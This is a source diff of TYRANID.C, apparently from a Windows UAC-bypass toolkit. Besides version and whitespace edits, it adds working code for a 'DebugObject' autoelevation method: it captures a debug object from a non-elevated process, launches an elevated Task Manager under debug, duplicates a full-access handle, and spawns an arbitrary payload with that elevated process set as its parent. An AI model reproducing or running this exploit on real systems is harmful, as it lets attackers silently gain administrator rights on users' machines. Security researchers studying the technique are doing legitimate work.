@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2017 - 2019
+*  (C) COPYRIGHT AUTHORS, 2017 - 2020
 *
 *  TITLE:       TYRANID.C
 *
-*  VERSION:     3.19
+*  VERSION:     3.23
 *
-*  DATE:        22 May 2019
+*  DATE:        17 Dec 2019
 *
 *  James Forshaw autoelevation method(s)
 *  Fine Dinning Tool (c) CIA
@@ -17,6 +17,7 @@
 *  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-2.html
 *  https://tyranidslair.blogspot.ru/2017/05/reading-your-way-around-uac-part-3.html
 *  https://tyranidslair.blogspot.com/2019/02/accessing-access-tokens-for-uiaccess.html
+*  https://googleprojectzero.blogspot.com/2019/12/calling-local-windows-rpc-servers-from.html
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -287,7 +288,7 @@ NTSTATUS ucmTokenModification(
             NULL,
             NULL,
             &si,
-            &pi)) 
+            &pi))
         {
             if (pi.hThread) CloseHandle(pi.hThread);
             if (pi.hProcess) CloseHandle(pi.hProcess);
@@ -384,7 +385,7 @@ NTSTATUS ucmTokenModUIAccessMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
-{  
+{
     NTSTATUS Status = STATUS_ACCESS_DENIED;
     LPWSTR lpszPayload = NULL;
     PSID pIntegritySid = NULL;
@@ -400,7 +401,7 @@ NTSTATUS ucmTokenModUIAccessMethod(
     PROCESS_INFORMATION pi;
 
     RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
-        
+
     do {
         //
         // Tweak and drop payload to %temp%.
@@ -425,7 +426,7 @@ NTSTATUS ucmTokenModUIAccessMethod(
         // Open process token.
         //
         Status = NtOpenProcessToken(shinfo.hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken);
-        if (!NT_SUCCESS(Status)) 
+        if (!NT_SUCCESS(Status))
             break;
 
         //
@@ -492,7 +493,7 @@ NTSTATUS ucmTokenModUIAccessMethod(
             NULL,
             NULL,
             &si,
-            &pi)) 
+            &pi))
         {
             if (WaitForSingleObject(pi.hProcess, 10000) == WAIT_TIMEOUT)
                 TerminateProcess(pi.hProcess, (UINT)-1);
@@ -519,4 +520,239 @@ NTSTATUS ucmTokenModUIAccessMethod(
     DeleteFile(szBuffer);
 
     return Status;
+}
+
+/*
+* ucmxCreateProcessFromParent
+*
+* Purpose:
+*
+* Create new process using parent process handle.
+*
+*/
+NTSTATUS ucmxCreateProcessFromParent(
+    _In_ HANDLE ParentProcess,
+    _In_ LPWSTR Payload)
+{
+    NTSTATUS status = STATUS_UNSUCCESSFUL;
+    SIZE_T size = 0x30;
+
+    STARTUPINFOEX si;
+    PROCESS_INFORMATION pi;
+
+    RtlSecureZeroMemory(&pi, sizeof(pi));
+    RtlSecureZeroMemory(&si, sizeof(si));
+    si.StartupInfo.cb = sizeof(STARTUPINFOEX);
+
+    do {
+        if (size > 1024)
+            break;
+
+        si.lpAttributeList = supHeapAlloc(size);
+        if (si.lpAttributeList) {
+
+            if (InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size)) {
+                if (UpdateProcThreadAttribute(si.lpAttributeList, 0,
+                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ParentProcess, sizeof(HANDLE), 0, 0)) //-V616
+                {
+                    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
+                    si.StartupInfo.wShowWindow = SW_SHOW;
+
+                    if (CreateProcess(NULL,
+                        Payload,
+                        NULL,
+                        NULL,
+                        FALSE,
+                        CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT,
+                        NULL,
+                        g_ctx->szSystemRoot,
+                        (LPSTARTUPINFO)&si,
+                        &pi))
+                    {
+                        CloseHandle(pi.hThread);
+                        CloseHandle(pi.hProcess);
+                        status = STATUS_SUCCESS;
+                    }
+                }
+            }
+
+            if (si.lpAttributeList)
+                DeleteProcThreadAttributeList(si.lpAttributeList); //dumb empty routine
+
+            supHeapFree(si.lpAttributeList);
+        }
+    } while (GetLastError() == ERROR_INSUFFICIENT_BUFFER);
+
+    return status;
+}
+
+/*
+* ucmDebugObjectMethod
+*
+* Purpose:
+*
+* Bypass UAC by direct RPC call to APPINFO and DebugObject use.
+*
+*/
+NTSTATUS ucmDebugObjectMethod(
+    _In_ LPWSTR lpszPayload
+)
+{
+    //UINT retryCount = 0;
+
+    NTSTATUS status = STATUS_ACCESS_DENIED;
+
+    HANDLE dbgHandle = NULL, dbgProcessHandle, dupHandle;
+
+    PROCESS_INFORMATION procInfo;
+
+    DEBUG_EVENT dbgEvent;
+
+    WCHAR szProcess[MAX_PATH * 2];
+
+
+    do {
+
+        //
+        // Spawn initial non elevated victim process under debug.
+        //
+
+
+        //do { /* remove comment for attempt to spam debug object within thread pool */
+
+        _strcpy(szProcess, g_ctx->szSystemDirectory);
+        _strcat(szProcess, WINVER_EXE);
+
+        if (!AicLaunchAdminProcess(szProcess,
+            szProcess,
+            0,
+            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
+            g_ctx->szSystemRoot,
+            T_DEFAULT_DESKTOP,
+            NULL,
+            INFINITE,
+            SW_HIDE,
+            &procInfo))
+        {
+            status = STATUS_UNSUCCESSFUL;
+            break;
+        }
+
+
+        //
+        // Capture debug object handle.
+        //
+
+        status = supGetProcessDebugObject(procInfo.hProcess,
+            &dbgHandle);
+
+        if (!NT_SUCCESS(status))
+            break;
+
+        //
+        // Detach debug and kill non elevated victim process.
+        //
+        NtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
+        TerminateProcess(procInfo.hProcess, 0);
+        CloseHandle(procInfo.hThread);
+        CloseHandle(procInfo.hProcess);
+
+        //} while (++retryCount < 20);
+
+        //
+        // Spawn elevated victim under debug.
+        //
+        _strcpy(szProcess, g_ctx->szSystemDirectory);
+        _strcat(szProcess, TASKMGR_EXE);
+        RtlSecureZeroMemory(&procInfo, sizeof(procInfo));
+        RtlSecureZeroMemory(&dbgEvent, sizeof(dbgEvent));
+
+        if (!AicLaunchAdminProcess(szProcess,
+            szProcess,
+            1,
+            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
+            g_ctx->szSystemRoot,
+            T_DEFAULT_DESKTOP,
+            NULL,
+            INFINITE,
+            SW_HIDE,
+            &procInfo))
+        {
+            status = STATUS_UNSUCCESSFUL;
+            break;
+        }
+
+        //
+        // Update thread TEB with debug object handle to receive debug events.
+        //
+        DbgUiSetThreadDebugObject(dbgHandle);
+        dbgProcessHandle = NULL;
+
+        //
+        // Debugger wait cycle.
+        //
+        while (1) {
+
+            if (!WaitForDebugEvent(&dbgEvent, INFINITE)) {
+                DbgPrint("GetLastError=%lx\r\n", GetLastError());
+            }
+
+            switch (dbgEvent.dwDebugEventCode) {
+
+                //
+                // Capture initial debug event process handle.
+                //
+            case CREATE_PROCESS_DEBUG_EVENT:
+                dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
+                break;
+            }
+
+            if (dbgProcessHandle)
+                break;
+
+            ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
+
+        }
+
+        if (dbgProcessHandle == NULL)
+            break;
+
+        //
+        // Create new handle from captured with PROCESS_ALL_ACCESS.
+        //
+        dupHandle = NULL;
+        status = NtDuplicateObject(dbgProcessHandle,
+            NtCurrentProcess(),
+            NtCurrentProcess(),
+            &dupHandle,
+            PROCESS_ALL_ACCESS,
+            0,
+            0);
+
+        if (NT_SUCCESS(status)) {
+            //
+            // Run new process with parent set to duplicated process handle.
+            //
+            ucmxCreateProcessFromParent(dupHandle, lpszPayload);
+            NtClose(dupHandle);
+        }
+
+        DbgUiSetThreadDebugObject(NULL);
+        NtClose(dbgHandle);
+        dbgHandle = NULL;
+
+        CloseHandle(dbgProcessHandle);
+
+        //
+        // Release victim process.
+        //
+        CloseHandle(procInfo.hThread);
+        TerminateProcess(procInfo.hProcess, 0);
+        CloseHandle(procInfo.hProcess);
+
+    } while (FALSE);
+
+    if (dbgHandle) NtClose(dbgHandle);
+    SetEvent(g_ctx->SharedContext.hCompletionEvent);
+    return status;
 }
